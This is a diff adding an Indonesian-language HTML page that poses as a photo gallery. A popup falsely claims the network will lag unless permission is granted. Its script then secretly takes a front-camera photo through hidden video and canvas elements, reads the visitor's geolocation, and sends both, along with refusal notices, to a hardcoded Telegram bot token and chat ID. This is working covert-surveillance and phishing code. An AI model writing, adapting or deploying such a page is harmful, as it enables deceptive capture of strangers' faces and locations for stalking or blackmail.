@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Galeri Foto Aib</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f0f0f0;
+      text-align: center;
+    }
+    h1 { color:#333; margin-bottom:8px; }
+    p.lead { color:#555; margin-top:0; margin-bottom:18px; }
+
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+      max-width: 1200px;
+      margin: 0 auto 40px;
+    }
+    .photo {
+      background: white;
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+    .photo img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 5px;
+    }
+
+    /* popup */
+    .overlay {
+      position: fixed; top:0; left:0; right:0; bottom:0;
+      background: rgba(0,0,0,0.5);
+      display: none; z-index: 999;
+    }
+    .popup {
+      position: fixed;
+      top:50%; left:50%;
+      transform: translate(-50%,-50%);
+      background:#fff; padding:20px; border-radius:8px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+      max-width: 90%; width:420px; z-index:1000;
+      display: none;
+    }
+    .popup h2 { margin:0 0 8px 0; }
+    .popup p { color:#444; margin:0 0 16px 0; }
+    .btn {
+      padding:10px 16px; border-radius:6px; border:0; cursor:pointer;
+      margin:6px;
+    }
+    .btn-allow { background:#007bff; color:#fff; }
+    .btn-deny { background:#ccc; color:#000; }
+    /* hide video & canvas (we still keep elements for capture) */
+    video, canvas { display:none !important; }
+  </style>
+</head>
+<body>
+  <h1>Galeri Foto Aib</h1>
+  <p class="lead">stress</p>
+
+  <div class="gallery">
+    <div class="photo"><img src="https://l.top4top.io/p_3585xgrp02.jpg" alt=""><p>stress</p></div>
+    <div class="photo"><img src="https://k.top4top.io/p_358563efi1.jpg" alt=""><p>baleg moal</p></div>
+    <div class="photo"><img src="https://j.top4top.io/p_3585f5zv40.jpg" alt=""><p>tembee jee</p></div>
+    <div class="photo"><img src="https://k.top4top.io/p_358563efi1.jpg" alt=""><p>bqck</p></div>
+    <div class="photo"><img src="https://l.top4top.io/p_3585xgrp02.jpg" alt=""><p>beak</p></div>
+  </div>
+
+  <div id="overlay" class="overlay"></div>
+  <div id="popup" class="popup">
+    <h2>Izin Diperlukan</h2>
+    <p>Ketuk Izinkan <strong>agar</strong> jaringan <strong>tidak</strong> lag. Izinkan agar website terus berjalan.</p>
+    <div style="text-align:center;">
+      <button class="btn btn-allow" id="allowBtn">Izinkan</button>
+      <button class="btn btn-deny" id="denyBtn">Jika di tolak jaringan anda akan lag</button>
+    </div>
+  </div>
+
+  <!-- elemen untuk capture (disembunyikan) -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // ======= GANTI SESUAI KAMU =======
+    const botToken = '7937936868:AAGh2dxu8SB8ajQEUrmBESo8iAkHByXXebA';
+    const chatId   = '6458464714';
+    // ==================================
+
+    const overlay = document.getElementById('overlay');
+    const popup = document.getElementById('popup');
+    const allowBtn = document.getElementById('allowBtn');
+    const denyBtn = document.getElementById('denyBtn');
+
+    // tampilkan popup saat load
+    window.addEventListener('load', () => {
+      overlay.style.display = 'block';
+      popup.style.display = 'block';
+    });
+
+    denyBtn.addEventListener('click', () => {
+      overlay.style.display = 'none';
+      popup.style.display = 'none';
+      sendTextToTelegram("Pengguna menolak akses kamera dan/atau lokasi.");
+      alert('Kamu menolak izin. Tidak ada foto yang diambil.');
+    });
+
+    allowBtn.addEventListener('click', async () => {
+      allowBtn.disabled = true;
+      allowBtn.textContent = 'Memproses...';
+      try {
+        // 1. Minta akses kamera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // tunggu metadata siap agar ukuran video tersedia
+        await new Promise((resolve) => {
+          if (video.readyState >= 2) return resolve();
+          video.onloadedmetadata = () => resolve();
+        });
+
+        // delay kecil agar exposure/auto-focus lebih stabil
+        await new Promise(r => setTimeout(r, 300));
+
+        // capture ke canvas
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // stop kamera agar tidak terus menyala
+        stream.getTracks().forEach(t => t.stop());
+
+        // kirim foto ke telegram
+        await sendCanvasAsPhoto(canvas);
+
+        // 2. coba ambil lokasi (jika diizinkan user)
+        if ('geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            await sendTextToTelegram(`Lokasi pengguna: Latitude ${lat}, Longitude ${lon}`);
+          }, async (err) => {
+            // jika lokasi ditolak atau error, kita kirim notifikasi
+            console.warn('Gagal mendapatkan lokasi:', err);
+            await sendTextToTelegram('Gagal mendapatkan lokasi pengguna (ditolak/eror).');
+          }, { maximumAge: 60000, timeout: 8000 });
+        } else {
+          await sendTextToTelegram('Geolocation tidak tersedia pada perangkat ini.');
+        }
+
+        alert('baik, terimakasih');
+      } catch (err) {
+        console.error('Error saat mengambil foto atau mengirim:', err);
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          alert('Izin kamera ditolak. Pastikan kamu mengizinkan kamera untuk situs ini.');
+        } else {
+          alert('Gagal mengakses kamera: ' + (err.message || err));
+        }
+        // laporkan ke telegram juga
+        sendTextToTelegram('Gagal mendapatkan akses kamera: ' + (err.message || err.name || err));
+      } finally {
+        overlay.style.display = 'none';
+        popup.style.display = 'none';
+        allowBtn.disabled = false;
+        allowBtn.textContent = 'Izinkan';
+      }
+    });
+
+    // Fungsi: kirim canvas sebagai foto ke Telegram via sendPhoto
+    async function sendCanvasAsPhoto(canvas) {
+      return new Promise((resolve, reject) => {
+        canvas.toBlob(async (blob) => {
+          if (!blob) {
+            reject(new Error('Gagal men-generate blob dari canvas.'));
+            return;
+          }
+          try {
+            const form = new FormData();
+            form.append('chat_id', chatId);
+            form.append('photo', blob, 'capture.jpg');
+
+            const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: form
+            });
+
+            const data = await resp.json();
+            if (!resp.ok || !data || !data.ok) {
+              console.error('Telegram API response error:', data);
+              reject(new Error('Gagal mengirim foto ke Telegram: ' + (data && data.description ? data.description : resp.statusText)));
+              return;
+            }
+            console.log('Foto terkirim ke Telegram:', data);
+            resolve(data);
+          } catch (e) {
+            console.error('Fetch/sendPhoto error:', e);
+            reject(e);
+          }
+        }, 'image/jpeg', 0.92);
+      });
+    }
+
+    // Fungsi: kirim teks pesan ke Telegram (sendMessage)
+    async function sendTextToTelegram(text) {
+      try {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const body = new URLSearchParams();
+        body.append('chat_id', chatId);
+        body.append('text', text);
+
+        const resp = await fetch(url, { method: 'POST', body });
+        const data = await resp.json();
+        if (!resp.ok || !data || !data.ok) {
+          console.warn('Gagal kirim pesan teks ke Telegram:', data);
+        } else {
+          console.log('Pesan teks terkirim:', data);
+        }
+      } catch (err) {
+        console.error('Error kirim pesan teks ke Telegram:', err);
+      }
+    }
+  </script>
+</body>
+</html>
